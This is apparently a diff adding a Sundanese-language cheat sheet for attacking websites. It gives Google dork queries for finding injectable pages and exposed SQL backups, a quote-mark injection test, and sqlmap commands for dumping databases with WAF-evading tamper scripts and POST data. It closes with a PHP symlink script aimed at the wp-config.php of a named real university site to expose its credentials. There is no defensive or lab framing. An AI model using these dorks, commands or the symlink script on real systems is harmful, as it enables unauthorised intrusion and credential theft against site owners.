@@ -1,0 +1,95 @@
+Dasar Google Dorking pikeun SQLi
+
+inurl:index.php?id=
+inurl:product.php?id=
+inurl:news.php?id=
+inurl:gallery.php?id=
+inurl:detail.php?id=
+Milarian Halaman Login Rentan
+inurl:login.php
+inurl:admin/login.php
+intitle:"Admin Login"
+
+Milarian Situs Berbasis PHP nu Rentan
+
+ext:php?id=
+ext:asp?id=
+ext:jsp?id=
+
+Milarian Database yang Bisa Diakses
+"index of" "database.sql"
+"index of" "backup.sql"
+
+Testing SQL Injection
+
+Saatos manggihkeun target, tinggal diuji ku payload dasar. Coba tambihkeun ' atanapi ", contona:
+
+
+site:target.com inurl:product.php?id=
+Balikkeun kana halaman éta sareng cobaan:
+
+http://target.com/product.php?id=1'
+
+You have an error in your SQL syntax;
+
+Lamun target rentan, bisa langsung diuji ku sqlmap (di Kali Linux, Termux, jsb.)
+
+
+
+
+sqlmap -u "http://target.com/product.php?id=1" --dbs
+
+1️⃣ Coba Make Level & Risk Lebih Tinggi
+Sababaraha server boga proteksi tambahan, coba make parameter --level jeung --risk:
+
+sqlmap -u "http://target.com/product.php?id=1" --dbs --level=5 --risk=3
+Level 5 bakal nguji leuwih loba payload.
+Risk 3 bakal ngagunakeun teknik nu leuwih agresif.
+Paké Method POST (Mun Paraméterna di Form)
+Lamun SQL Injection aya dina form login atanapi input POST, tambihan --data:
+
+sqlmap -u "http://target.com/login.php" --data="username=admin&password=123" --dbs
+
+Ieu dipaké keur nguji situs nu make login form atanapi metode POST request.
+Sababaraha server gaduh proteksi WAF (Web Application Firewall), cobian bypass ku:
+
+sqlmap -u "http://target.com/product.php?id=1" --dbs --random-agent --tamper=space2comment
+
+--random-agent → Ngagunakeun user-agent acak supaya bot henteu kacasual.
+--tamper=space2comment → Bypass proteksi ku ngagunakeun encoding khusus.
+Mun masih gagal, cobian tamper script lianna:
+--tamper=charencode
+--tamper=between
+--tamper=equaltolike
+
+Pake Mode Manual (Tingali Responsenya)
+Mun masih kosong, cobian mode interaktif supaya sqlmap henteu otomatis nutup:
+
+
+sqlmap -u "http://target.com/product.php?id=1" --dbs -v 3
+
+ → ningkatkeun verbosity supaya bisa ningali respon server.
+Mun aya error atanapi pesan aneh, bisa dicek deui apakah situsna make proteksi tambahan.
+
+http://target.com/product.php?id=MQ==
+
+Di dieu, MQ== mangrupa Base64 encode tina angka 1.
+Cobian decode:
+
+echo "MQ==" | base64 -d
+
+ Pake Proxy BurpSuite pikeun Intercept Request
+Mun teu yakin kana responna, gunakeun BurpSuite pikeun nangkep request:
+
+sqlmap -u "http://target.com/product.php?id=1" --proxy=http://127.0.0.1:8080 --dbs
+
+<?php
+$target = "/var/www/vhosts/arsitektur.ub.ac.id/httpdocs/wp-config.php"; // Ganti ku path target
+$link = "symlink-wp.php"; // Nama file symlink
+
+if (symlink($target, $link)) {
+    echo "✅ Symlink berhasil dibuat! Coba akses: <a href='$link'>$link</a>";
+} else {
+    echo "❌ Gagal membuat symlink! Server mungkin aman.";
+}
+?>
